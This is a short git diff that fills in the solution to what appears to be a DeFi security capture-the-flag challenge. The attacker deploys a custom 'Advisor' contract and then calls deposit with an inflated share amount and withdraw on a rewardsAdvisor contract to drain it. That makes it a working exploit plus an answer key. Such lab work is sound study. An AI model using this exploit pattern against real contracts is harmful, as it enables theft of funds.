@@ -49,6 +49,13 @@ before(async () => {
 it("solves the challenge", async function () {
 
   // implement solution here
+  let ad = await ethers.getContractFactory("Advisor");
+  let a = await ad.connect(attacker).deploy()
+
+  let s = precision.mul(100000000)
+
+  await rewardsAdvisor.connect(attacker).deposit(s, a.address, attacker.getAddress())
+  await rewardsAdvisor.connect(attacker).withdraw(s, attacker.getAddress(), attacker.getAddress())
 
 });
 
